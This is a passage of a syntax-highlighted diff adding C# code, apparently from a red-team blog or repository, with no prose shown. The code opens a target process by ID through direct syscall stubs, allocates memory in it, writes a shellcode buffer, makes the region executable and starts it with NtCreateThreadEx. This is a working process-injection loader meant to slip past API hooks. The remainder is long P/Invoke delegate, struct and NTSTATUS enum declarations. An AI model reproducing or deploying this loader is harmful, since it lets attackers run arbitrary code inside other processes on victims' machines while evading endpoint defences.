+</span></span><span style="display:flex;"><span>        NtOpenProcess ntOpenProcess = (NtOpenProcess) Marshal.GetDelegateForFunctionPointer(stub, <span style="color:#66d9ef">typeof</span>(NtOpenProcess));
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>        IntPtr hProcess = IntPtr.Zero;
+</span></span><span style="display:flex;"><span>        OBJECT_ATTRIBUTES oa = <span style="color:#66d9ef">new</span> OBJECT_ATTRIBUTES();
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>        CLIENT_ID ci = <span style="color:#66d9ef">new</span> CLIENT_ID
+</span></span><span style="display:flex;"><span>        {
+</span></span><span style="display:flex;"><span>            UniqueProcess = (IntPtr)<span style="color:#66d9ef">uint</span>.Parse(args[<span style="color:#ae81ff">0</span>])
+</span></span><span style="display:flex;"><span>        };
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>        NTSTATUS result = ntOpenProcess(
+</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">ref</span> hProcess,
+</span></span><span style="display:flex;"><span>            <span style="color:#ae81ff">0x001F0FFF</span>,
+</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">ref</span> oa,
+</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">ref</span> ci);
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>        <span style="color:#75715e">// NtAllocateVirtualMemory</span>
+</span></span><span style="display:flex;"><span>        stub = Generic.GetSyscallStub(<span style="color:#e6db74">&#34;NtAllocateVirtualMemory&#34;</span>);
+</span></span><span style="display:flex;"><span>        NtAllocateVirtualMemory ntAllocateVirtualMemory = (NtAllocateVirtualMemory) Marshal.GetDelegateForFunctionPointer(stub, <span style="color:#66d9ef">typeof</span>(NtAllocateVirtualMemory));
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>        IntPtr baseAddress = IntPtr.Zero;
+</span></span><span style="display:flex;"><span>        IntPtr regionSize = (IntPtr)_shellcode.Length;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>        result = ntAllocateVirtualMemory(
+</span></span><span style="display:flex;"><span>            hProcess,
+</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">ref</span> baseAddress,
+</span></span><span style="display:flex;"><span>            IntPtr.Zero,
+</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">ref</span> regionSize,
+</span></span><span style="display:flex;"><span>            <span style="color:#ae81ff">0x1000</span> | <span style="color:#ae81ff">0x2000</span>,
+</span></span><span style="display:flex;"><span>            <span style="color:#ae81ff">0x04</span>);
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>        <span style="color:#75715e">// NtWriteVirtualMemory</span>
+</span></span><span style="display:flex;"><span>        stub = Generic.GetSyscallStub(<span style="color:#e6db74">&#34;NtWriteVirtualMemory&#34;</span>);
+</span></span><span style="display:flex;"><span>        NtWriteVirtualMemory ntWriteVirtualMemory = (NtWriteVirtualMemory) Marshal.GetDelegateForFunctionPointer(stub, <span style="color:#66d9ef">typeof</span>(NtWriteVirtualMemory));
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">var</span> buffer = Marshal.AllocHGlobal(_shellcode.Length);
+</span></span><span style="display:flex;"><span>        Marshal.Copy(_shellcode, <span style="color:#ae81ff">0</span>, buffer, _shellcode.Length);
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">uint</span> bytesWritten = <span style="color:#ae81ff">0</span>;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>        result = ntWriteVirtualMemory(
+</span></span><span style="display:flex;"><span>            hProcess,
+</span></span><span style="display:flex;"><span>            baseAddress,
+</span></span><span style="display:flex;"><span>            buffer,
+</span></span><span style="display:flex;"><span>            (<span style="color:#66d9ef">uint</span>)_shellcode.Length,
+</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">ref</span> bytesWritten);
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>        <span style="color:#75715e">// NtProtectVirtualMemory</span>
+</span></span><span style="display:flex;"><span>        stub = Generic.GetSyscallStub(<span style="color:#e6db74">&#34;NtProtectVirtualMemory&#34;</span>);
+</span></span><span style="display:flex;"><span>        NtProtectVirtualMemory ntProtectVirtualMemory = (NtProtectVirtualMemory) Marshal.GetDelegateForFunctionPointer(stub, <span style="color:#66d9ef">typeof</span>(NtProtectVirtualMemory));
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">uint</span> oldProtect = <span style="color:#ae81ff">0</span>;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>        result = ntProtectVirtualMemory(
+</span></span><span style="display:flex;"><span>            hProcess,
+</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">ref</span> baseAddress,
+</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">ref</span> regionSize,
+</span></span><span style="display:flex;"><span>            <span style="color:#ae81ff">0x20</span>,
+</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">ref</span> oldProtect);
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>        <span style="color:#75715e">// NtCreateThreadEx</span>
+</span></span><span style="display:flex;"><span>        stub = Generic.GetSyscallStub(<span style="color:#e6db74">&#34;NtCreateThreadEx&#34;</span>);
+</span></span><span style="display:flex;"><span>        NtCreateThreadEx ntCreateThreadEx = (NtCreateThreadEx) Marshal.GetDelegateForFunctionPointer(stub, <span style="color:#66d9ef">typeof</span>(NtCreateThreadEx));
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>        IntPtr hThread = IntPtr.Zero;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>        result = ntCreateThreadEx(
+</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">out</span> hThread,
+</span></span><span style="display:flex;"><span>            ACCESS_MASK.MAXIMUM_ALLOWED,
+</span></span><span style="display:flex;"><span>            IntPtr.Zero,
+</span></span><span style="display:flex;"><span>            hProcess,
+</span></span><span style="display:flex;"><span>            baseAddress,
+</span></span><span style="display:flex;"><span>            IntPtr.Zero,
+</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">false</span>,
+</span></span><span style="display:flex;"><span>            <span style="color:#ae81ff">0</span>,
+</span></span><span style="display:flex;"><span>            <span style="color:#ae81ff">0</span>,
+</span></span><span style="display:flex;"><span>            <span style="color:#ae81ff">0</span>,
+</span></span><span style="display:flex;"><span>            IntPtr.Zero);
+</span></span><span style="display:flex;"><span>        }
+</span></span><span style="display:flex;"><span><span style="color:#a6e22e">
+</span></span></span><span style="display:flex;"><span><span style="color:#a6e22e">        [UnmanagedFunctionPointer(CallingConvention.StdCall)]</span>
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">delegate</span> NTSTATUS NtOpenProcess(
+</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">ref</span> IntPtr ProcessHandle,
+</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">uint</span> DesiredAccess,
+</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">ref</span> OBJECT_ATTRIBUTES ObjectAttributes,
+</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">ref</span> CLIENT_ID ClientId);
+</span></span><span style="display:flex;"><span><span style="color:#a6e22e">
+</span></span></span><span style="display:flex;"><span><span style="color:#a6e22e">        [UnmanagedFunctionPointer(CallingConvention.StdCall)]</span>
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">delegate</span> NTSTATUS NtAllocateVirtualMemory(
+</span></span><span style="display:flex;"><span>            IntPtr ProcessHandle,
+</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">ref</span> IntPtr BaseAddress,
+</span></span><span style="display:flex;"><span>            IntPtr ZeroBits,
+</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">ref</span> IntPtr RegionSize,
+</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">uint</span> AllocationType,
+</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">uint</span> Protect);
+</span></span><span style="display:flex;"><span><span style="color:#a6e22e">
+</span></span></span><span style="display:flex;"><span><span style="color:#a6e22e">        [UnmanagedFunctionPointer(CallingConvention.StdCall)]</span>
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">delegate</span> NTSTATUS NtWriteVirtualMemory(
+</span></span><span style="display:flex;"><span>            IntPtr ProcessHandle,
+</span></span><span style="display:flex;"><span>            IntPtr BaseAddress,
+</span></span><span style="display:flex;"><span>            IntPtr Buffer,
+</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">uint</span> BufferLength,
+</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">ref</span> <span style="color:#66d9ef">uint</span> BytesWritten);
+</span></span><span style="display:flex;"><span><span style="color:#a6e22e">
+</span></span></span><span style="display:flex;"><span><span style="color:#a6e22e">        [UnmanagedFunctionPointer(CallingConvention.StdCall)]</span>
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">delegate</span> NTSTATUS NtProtectVirtualMemory(
+</span></span><span style="display:flex;"><span>            IntPtr ProcessHandle,
+</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">ref</span> IntPtr BaseAddress,
+</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">ref</span> IntPtr RegionSize,
+</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">uint</span> NewProtect,
+</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">ref</span> <span style="color:#66d9ef">uint</span> OldProtect);
+</span></span><span style="display:flex;"><span><span style="color:#a6e22e">
+</span></span></span><span style="display:flex;"><span><span style="color:#a6e22e">        [UnmanagedFunctionPointer(CallingConvention.StdCall)]</span>
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">delegate</span> NTSTATUS NtCreateThreadEx(
+</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">out</span> IntPtr threadHandle,
+</span></span><span style="display:flex;"><span>            ACCESS_MASK desiredAccess,
+</span></span><span style="display:flex;"><span>            IntPtr objectAttributes,
+</span></span><span style="display:flex;"><span>            IntPtr processHandle,
+</span></span><span style="display:flex;"><span>            IntPtr startAddress,
+</span></span><span style="display:flex;"><span>            IntPtr parameter,
+</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">bool</span> createSuspended,
+</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">int</span> stackZeroBits,
+</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">int</span> sizeOfStack,
+</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">int</span> maximumStackSize,
+</span></span><span style="display:flex;"><span>            IntPtr attributeList);
+</span></span><span style="display:flex;"><span><span style="color:#a6e22e">
+</span></span></span><span style="display:flex;"><span><span style="color:#a6e22e">        [StructLayout(LayoutKind.Sequential, Pack = 0)]</span>
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">struct</span> <span style="color:#a6e22e">OBJECT_ATTRIBUTES</span>
+</span></span><span style="display:flex;"><span>        {
+</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">public</span> <span style="color:#66d9ef">int</span> Length;
+</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">public</span> IntPtr RootDirectory;
+</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">public</span> IntPtr ObjectName;
+</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">public</span> <span style="color:#66d9ef">uint</span> Attributes;
+</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">public</span> IntPtr SecurityDescriptor;
+</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">public</span> IntPtr SecurityQualityOfService;
+</span></span><span style="display:flex;"><span>        }
+</span></span><span style="display:flex;"><span><span style="color:#a6e22e">
+</span></span></span><span style="display:flex;"><span><span style="color:#a6e22e">        [StructLayout(LayoutKind.Sequential)]</span>
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">struct</span> <span style="color:#a6e22e">CLIENT_ID</span>
+</span></span><span style="display:flex;"><span>        {
+</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">public</span> IntPtr UniqueProcess;
+</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">public</span> IntPtr UniqueThread;
+</span></span><span style="display:flex;"><span>        }
+</span></span><span style="display:flex;"><span><span style="color:#a6e22e">
+</span></span></span><span style="display:flex;"><span><span style="color:#a6e22e">        [Flags]</span>
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">enum</span> ACCESS_MASK : <span style="color:#66d9ef">uint</span>
+</span></span><span style="display:flex;"><span>        {
+</span></span><span style="display:flex;"><span>            DELETE = <span style="color:#ae81ff">0x00010000</span>,
+</span></span><span style="display:flex;"><span>            READ_CONTROL = <span style="color:#ae81ff">0x00020000</span>,
+</span></span><span style="display:flex;"><span>            WRITE_DAC = <span style="color:#ae81ff">0x00040000</span>,
+</span></span><span style="display:flex;"><span>            WRITE_OWNER = <span style="color:#ae81ff">0x00080000</span>,
+</span></span><span style="display:flex;"><span>            SYNCHRONIZE = <span style="color:#ae81ff">0x00100000</span>,
+</span></span><span style="display:flex;"><span>            STANDARD_RIGHTS_REQUIRED = <span style="color:#ae81ff">0x000F0000</span>,
+</span></span><span style="display:flex;"><span>            STANDARD_RIGHTS_READ = <span style="color:#ae81ff">0x00020000</span>,
+</span></span><span style="display:flex;"><span>            STANDARD_RIGHTS_WRITE = <span style="color:#ae81ff">0x00020000</span>,
+</span></span><span style="display:flex;"><span>            STANDARD_RIGHTS_EXECUTE = <span style="color:#ae81ff">0x00020000</span>,
+</span></span><span style="display:flex;"><span>            STANDARD_RIGHTS_ALL = <span style="color:#ae81ff">0x001F0000</span>,
+</span></span><span style="display:flex;"><span>            SPECIFIC_RIGHTS_ALL = <span style="color:#ae81ff">0x0000FFF</span>,
+</span></span><span style="display:flex;"><span>            ACCESS_SYSTEM_SECURITY = <span style="color:#ae81ff">0x01000000</span>,
+</span></span><span style="display:flex;"><span>            MAXIMUM_ALLOWED = <span style="color:#ae81ff">0x02000000</span>,
+</span></span><span style="display:flex;"><span>            GENERIC_READ = <span style="color:#ae81ff">0x80000000</span>,
+</span></span><span style="display:flex;"><span>            GENERIC_WRITE = <span style="color:#ae81ff">0x40000000</span>,
+</span></span><span style="display:flex;"><span>            GENERIC_EXECUTE = <span style="color:#ae81ff">0x20000000</span>,
+</span></span><span style="display:flex;"><span>            GENERIC_ALL = <span style="color:#ae81ff">0x10000000</span>,
+</span></span><span style="display:flex;"><span>            DESKTOP_READOBJECTS = <span style="color:#ae81ff">0x00000001</span>,
+</span></span><span style="display:flex;"><span>            DESKTOP_CREATEWINDOW = <span style="color:#ae81ff">0x00000002</span>,
+</span></span><span style="display:flex;"><span>            DESKTOP_CREATEMENU = <span style="color:#ae81ff">0x00000004</span>,
+</span></span><span style="display:flex;"><span>            DESKTOP_HOOKCONTROL = <span style="color:#ae81ff">0x00000008</span>,
+</span></span><span style="display:flex;"><span>            DESKTOP_JOURNALRECORD = <span style="color:#ae81ff">0x00000010</span>,
+</span></span><span style="display:flex;"><span>            DESKTOP_JOURNALPLAYBACK = <span style="color:#ae81ff">0x00000020</span>,
+</span></span><span style="display:flex;"><span>            DESKTOP_ENUMERATE = <span style="color:#ae81ff">0x00000040</span>,
+</span></span><span style="display:flex;"><span>            DESKTOP_WRITEOBJECTS = <span style="color:#ae81ff">0x00000080</span>,
+</span></span><span style="display:flex;"><span>            DESKTOP_SWITCHDESKTOP = <span style="color:#ae81ff">0x00000100</span>,
+</span></span><span style="display:flex;"><span>            WINSTA_ENUMDESKTOPS = <span style="color:#ae81ff">0x00000001</span>,
+</span></span><span style="display:flex;"><span>            WINSTA_READATTRIBUTES = <span style="color:#ae81ff">0x00000002</span>,
+</span></span><span style="display:flex;"><span>            WINSTA_ACCESSCLIPBOARD = <span style="color:#ae81ff">0x00000004</span>,
+</span></span><span style="display:flex;"><span>            WINSTA_CREATEDESKTOP = <span style="color:#ae81ff">0x00000008</span>,
+</span></span><span style="display:flex;"><span>            WINSTA_WRITEATTRIBUTES = <span style="color:#ae81ff">0x00000010</span>,
+</span></span><span style="display:flex;"><span>            WINSTA_ACCESSGLOBALATOMS = <span style="color:#ae81ff">0x00000020</span>,
+</span></span><span style="display:flex;"><span>            WINSTA_EXITWINDOWS = <span style="color:#ae81ff">0x00000040</span>,
+</span></span><span style="display:flex;"><span>            WINSTA_ENUMERATE = <span style="color:#ae81ff">0x00000100</span>,
+</span></span><span style="display:flex;"><span>            WINSTA_READSCREEN = <span style="color:#ae81ff">0x00000200</span>,
+</span></span><span style="display:flex;"><span>            WINSTA_ALL_ACCESS = <span style="color:#ae81ff">0x0000037F</span>,
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>            SECTION_ALL_ACCESS = <span style="color:#ae81ff">0x10000000</span>,
+</span></span><span style="display:flex;"><span>            SECTION_QUERY = <span style="color:#ae81ff">0x0001</span>,
+</span></span><span style="display:flex;"><span>            SECTION_MAP_WRITE = <span style="color:#ae81ff">0x0002</span>,
+</span></span><span style="display:flex;"><span>            SECTION_MAP_READ = <span style="color:#ae81ff">0x0004</span>,
+</span></span><span style="display:flex;"><span>            SECTION_MAP_EXECUTE = <span style="color:#ae81ff">0x0008</span>,
+</span></span><span style="display:flex;"><span>            SECTION_EXTEND_SIZE = <span style="color:#ae81ff">0x0010</span>
+</span></span><span style="display:flex;"><span>        };
+</span></span><span style="display:flex;"><span><span style="color:#a6e22e">
+</span></span></span><span style="display:flex;"><span><span style="color:#a6e22e">        [Flags]</span>
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">enum</span> NTSTATUS : <span style="color:#66d9ef">uint</span>
+</span></span><span style="display:flex;"><span>        {
+</span></span><span style="display:flex;"><span>            <span style="color:#75715e">// Success</span>
+</span></span><span style="display:flex;"><span>            Success = <span style="color:#ae81ff">0x00000000</span>,
+</span></span><span style="display:flex;"><span>            Wait0 = <span style="color:#ae81ff">0x00000000</span>,
+</span></span><span style="display:flex;"><span>            Wait1 = <span style="color:#ae81ff">0x00000001</span>,
+</span></span><span style="display:flex;"><span>            Wait2 = <span style="color:#ae81ff">0x00000002</span>,
+</span></span><span style="display:flex;"><span>            Wait3 = <span style="color:#ae81ff">0x00000003</span>,
+</span></span><span style="display:flex;"><span>            Wait63 = <span style="color:#ae81ff">0x0000003f</span>,
+</span></span><span style="display:flex;"><span>            Abandoned = <span style="color:#ae81ff">0x00000080</span>,
+</span></span><span style="display:flex;"><span>            AbandonedWait0 = <span style="color:#ae81ff">0x00000080</span>,
+</span></span><span style="display:flex;"><span>            AbandonedWait1 = <span style="color:#ae81ff">0x00000081</span>,
+</span></span><span style="display:flex;"><span>            AbandonedWait2 = <span style="color:#ae81ff">0x00000082</span>,
+</span></span><span style="display:flex;"><span>            AbandonedWait3 = <span style="color:#ae81ff">0x00000083</span>,
+</span></span><span style="display:flex;"><span>            AbandonedWait63 = <span style="color:#ae81ff">0x000000bf</span>,
+</span></span><span style="display:flex;"><span>            UserApc = <span style="color:#ae81ff">0x000000c0</span>,
+</span></span><span style="display:flex;"><span>            KernelApc = <span style="color:#ae81ff">0x00000100</span>,
+</span></span><span style="display:flex;"><span>            Alerted = <span style="color:#ae81ff">0x00000101</span>,
+</span></span><span style="display:flex;"><span>            Timeout = <span style="color:#ae81ff">0x00000102</span>,
+</span></span><span style="display:flex;"><span>            Pending = <span style="color:#ae81ff">0x00000103</span>,
+</span></span><span style="display:flex;"><span>            Reparse = <span style="color:#ae81ff">0x00000104</span>,
+</span></span><span style="display:flex;"><span>            MoreEntries = <span style="color:#ae81ff">0x00000105</span>,
+</span></span><span style="display:flex;"><span>            NotAllAssigned = <span style="color:#ae81ff">0x00000106</span>,
+</span></span><span style="display:flex;"><span>            SomeNotMapped = <span style="color:#ae81ff">0x00000107</span>,
+</span></span><span style="display:flex;"><span>            OpLockBreakInProgress = <span style="color:#ae81ff">0x00000108</span>,
+</span></span><span style="display:flex;"><span>            VolumeMounted = <span style="color:#ae81ff">0x00000109</span>,
+</span></span><span style="display:flex;"><span>            RxActCommitted = <span style="color:#ae81ff">0x0000010a</span>,
+</span></span><span style="display:flex;"><span>            NotifyCleanup = <span style="color:#ae81ff">0x0000010b</span>,
+</span></span><span style="display:flex;"><span>            NotifyEnumDir = <span style="color:#ae81ff">0x0000010c</span>,
+</span></span><span style="display:flex;"><span>            NoQuotasForAccount = <span style="color:#ae81ff">0x0000010d</span>,
+</span></span><span style="display:flex;"><span>            PrimaryTransportConnectFailed = <span style="color:#ae81ff">0x0000010e</span>,
+</span></span><span style="display:flex;"><span>            PageFaultTransition = <span style="color:#ae81ff">0x00000110</span>,
+</span></span><span style="display:flex;"><span>            PageFaultDemandZero = <span style="color:#ae81ff">0x00000111</span>,
+</span></span><span style="display:flex;"><span>            PageFaultCopyOnWrite = <span style="color:#ae81ff">0x00000112</span>,
+</span></span><span style="display:flex;"><span>            PageFaultGuardPage = <span style="color:#ae81ff">0x00000113</span>,
+</span></span><span style="display:flex;"><span>            PageFaultPagingFile = <span style="color:#ae81ff">0x00000114</span>,
+</span></span><span style="display:flex;"><span>            CrashDump = <span style="color:#ae81ff">0x00000116</span>,
+</span></span><span style="display:flex;"><span>            ReparseObject = <span style="color:#ae81ff">0x00000118</span>,
+</span></span><span style="display:flex;"><span>            NothingToTerminate = <span style="color:#ae81ff">0x00000122</span>,
+</span></span><span style="display:flex;"><span>            ProcessNotInJob = <span style="color:#ae81ff">0x00000123</span>,
+</span></span><span style="display:flex;"><span>            ProcessInJob = <span style="color:#ae81ff">0x00000124</span>,
+</span></span><span style="display:flex;"><span>            ProcessCloned = <span style="color:#ae81ff">0x00000129</span>,
+</span></span><span style="display:flex;"><span>            FileLockedWithOnlyReaders = <span style="color:#ae81ff">0x0000012a</span>,
+</span></span><span style="display:flex;"><span>            FileLockedWithWriters = <span style="color:#ae81ff">0x0000012b</span>,
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>            <span style="color:#75715e">// Informational</span>
+</span></span><span style="display:flex;"><span>            Informational = <span style="color:#ae81ff">0x40000000</span>,
+</span></span><span style="display:flex;"><span>            ObjectNameExists = <span style="color:#ae81ff">0x40000000</span>,
+</span></span><span style="display:flex;"><span>            ThreadWasSuspended = <span style="color:#ae81ff">0x40000001</span>,
+</span></span><span style="display:flex;"><span>            WorkingSetLimitRange = <span style="color:#ae81ff">0x40000002</span>,
+</span></span><span style="display:flex;"><span>            ImageNotAtBase = <span style="color:#ae81ff">0x40000003</span>,
+</span></span><span style="display:flex;"><span>            RegistryRecovered = <span style="color:#ae81ff">0x40000009</span>,
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>            <span style="color:#75715e">// Warning</span>
+</span></span><span style="display:flex;"><span>            Warning = <span style="color:#ae81ff">0x80000000</span>,
+</span></span><span style="display:flex;"><span>            GuardPageViolation = <span style="color:#ae81ff">0x80000001</span>,
+</span></span><span style="display:flex;"><span>            DatatypeMisalignment = <span style="color:#ae81ff">0x80000002</span>,
+</span></span><span style="display:flex;"><span>            Breakpoint = <span style="color:#ae81ff">0x80000003</span>,
+</span></span><span style="display:flex;"><span>            SingleStep = <span style="color:#ae81ff">0x80000004</span>,
+</span></span><span style="display:flex;"><span>            BufferOverflow = <span style="color:#ae81ff">0x80000005</span>,
+</span></span><span style="display:flex;"><span>            NoMoreFiles = <span style="color:#ae81ff">0x80000006</span>,
+</span></span><span style="display:flex;"><span>            HandlesClosed = <span style="color:#ae81ff">0x8000000a</span>,
+</span></span><span style="display:flex;"><span>            PartialCopy = <span style="color:#ae81ff">0x8000000d</span>,
+</span></span><span style="display:flex;"><span>            DeviceBusy = <span style="color:#ae81ff">0x80000011</span>,
+</span></span><span style="display:flex;"><span>            InvalidEaName = <span style="color:#ae81ff">0x80000013</span>,
+</span></span><span style="display:flex;"><span>            EaListInconsistent = <span style="color:#ae81ff">0x80000014</span>,
+</span></span><span style="display:flex;"><span>            NoMoreEntries = <span style="color:#ae81ff">0x8000001a</span>,
+</span></span><span style="display:flex;"><span>            LongJump = <span style="color:#ae81ff">0x80000026</span>,
+</span></span><span style="display:flex;"><span>            DllMightBeInsecure = <span style="color:#ae81ff">0x8000002b</span>,
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>            <span style="color:#75715e">// Error</span>
+</span></span><span style="display:flex;"><span>            Error = <span style="color:#ae81ff">0xc0000000</span>,
+</span></span><span style="display:flex;"><span>            Unsuccessful = <span style="color:#ae81ff">0xc0000001</span>,
+</span></span><span style="display:flex;"><span>            NotImplemented = <span style="color:#ae81ff">0xc0000002</span>,
+</span></span><span style="display:flex;"><span>            InvalidInfoClass = <span style="color:#ae81ff">0xc0000003</span>,
+</span></span><span style="display:flex;"><span>            InfoLengthMismatch = <span style="color:#ae81ff">0xc0000004</span>,
+</span></span><span style="display:flex;"><span>            AccessViolation = <span style="color:#ae81ff">0xc0000005</span>,
+</span></span><span style="display:flex;"><span>            InPageError = <span style="color:#ae81ff">0xc0000006</span>,
+</span></span><span style="display:flex;"><span>            PagefileQuota = <span style="color:#ae81ff">0xc0000007</span>,
+</span></span><span style="display:flex;"><span>            InvalidHandle = <span style="color:#ae81ff">0xc0000008</span>,
+</span></span><span style="display:flex;"><span>            BadInitialStack = <span style="color:#ae81ff">0xc0000009</span>,
+</span></span><span style="display:flex;"><span>            BadInitialPc = <span style="color:#ae81ff">0xc000000a</span>,
+</span></span><span style="display:flex;"><span>            InvalidCid = <span style="color:#ae81ff">0xc000000b</span>,
+</span></span><span style="display:flex;"><span>            TimerNotCanceled = <span style="color:#ae81ff">0xc000000c</span>,
+</span></span><span style="display:flex;"><span>            InvalidParameter = <span style="color:#ae81ff">0xc000000d</span>,
+</span></span><span style="display:flex;"><span>            NoSuchDevice = <span style="color:#ae81ff">0xc000000e</span>,
+</span></span><span style="display:flex;"><span>            NoSuchFile = <span style="color:#ae81ff">0xc000000f</span>,
+</span></span><span style="display:flex;"><span>            InvalidDeviceRequest = <span style="color:#ae81ff">0xc0000010</span>,
+</span></span><span style="display:flex;"><span>            EndOfFile = <span style="color:#ae81ff">0xc0000011</span>,
+</span></span><span style="display:flex;"><span>            WrongVolume = <span style="color:#ae81ff">0xc0000012</span>,
+</span></span><span style="display:flex;"><span>            NoMediaInDevice = <span style="color:#ae81ff">0xc0000013</span>,
+</span></span><span style="display:flex;"><span>            NoMemory = <span style="color:#ae81ff">0xc0000017</span>,
+</span></span><span style="display:flex;"><span>            ConflictingAddresses = <span style="color:#ae81ff">0xc0000018</span>,
+</span></span><span style="display:flex;"><span>            NotMappedView = <span style="color:#ae81ff">0xc0000019</span>,
+</span></span><span style="display:flex;"><span>            UnableToFreeVm = <span style="color:#ae81ff">0xc000001a</span>,
+</span></span><span style="display:flex;"><span>            UnableToDeleteSection = <span style="color:#ae81ff">0xc000001b</span>,
+</span></span><span style="display:flex;"><span>            IllegalInstruction = <span style="color:#ae81ff">0xc000001d</span>,
+</span></span><span style="display:flex;"><span>            AlreadyCommitted = <span style="color:#ae81ff">0xc0000021</span>,
+</span></span><span style="display:flex;"><span>            AccessDenied = <span style="color:#ae81ff">0xc0000022</span>,
+</span></span><span style="display:flex;"><span>            BufferTooSmall = <span style="color:#ae81ff">0xc0000023</span>,
+</span></span><span style="display:flex;"><span>            ObjectTypeMismatch = <span style="color:#ae81ff">0xc0000024</span>,
+</span></span><span style="display:flex;"><span>            NonContinuableException = <span style="color:#ae81ff">0xc0000025</span>,
+</span></span><span style="display:flex;"><span>            BadStack = <span style="color:#ae81ff">0xc0000028</span>,
+</span></span><span style="display:flex;"><span>            NotLocked = <span style="color:#ae81ff">0xc000002a</span>,
+</span></span><span style="display:flex;"><span>            NotCommitted = <span style="color:#ae81ff">0xc000002d</span>,
+</span></span><span style="display:flex;"><span>            InvalidParameterMix = <span style="color:#ae81ff">0xc0000030</span>,
+</span></span><span style="display:flex;"><span>            ObjectNameInvalid = <span style="color:#ae81ff">0xc0000033</span>,
+</span></span><span style="display:flex;"><span>            ObjectNameNotFound = <span style="color:#ae81ff">0xc0000034</span>,
+</span></span><span style="display:flex;"><span>            ObjectNameCollision = <span style="color:#ae81ff">0xc0000035</span>,
+</span></span><span style="display:flex;"><span>            ObjectPathInvalid = <span style="color:#ae81ff">0xc0000039</span>,
+</span></span><span style="display:flex;"><span>            ObjectPathNotFound = <span style="color:#ae81ff">0xc000003a</span>,
+</span></span><span style="display:flex;"><span>            ObjectPathSyntaxBad = <span style="color:#ae81ff">0xc000003b</span>,
+</span></span><span style="display:flex;"><span>            DataOverrun = <span style="color:#ae81ff">0xc000003c</span>,
+</span></span><span style="display:flex;"><span>            DataLate = <span style="color:#ae81ff">0xc000003d</span>,
+</span></span><span style="display:flex;"><span>            DataError = <span style="color:#ae81ff">0xc000003e</span>,
+</span></span><span style="display:flex;"><span>            CrcError = <span style="color:#ae81ff">0xc000003f</span>,
+</span></span><span style="display:flex;"><span>            SectionTooBig = <span style="color:#ae81ff">0xc0000040</span>,
+</span></span><span style="display:flex;"><span>            PortConnectionRefused = <span style="color:#ae81ff">0xc0000041</span>,
+</span></span><span style="display:flex;"><span>            InvalidPortHandle = <span style="color:#ae81ff">0xc0000042</span>,
+</span></span><span style="display:flex;"><span>            SharingViolation = <span style="color:#ae81ff">0xc0000043</span>,
+</span></span><span style="display:flex;"><span>            QuotaExceeded = <span style="color:#ae81ff">0xc0000044</span>,
+</span></span><span style="display:flex;"><span>            InvalidPageProtection = <span style="color:#ae81ff">0xc0000045</span>,
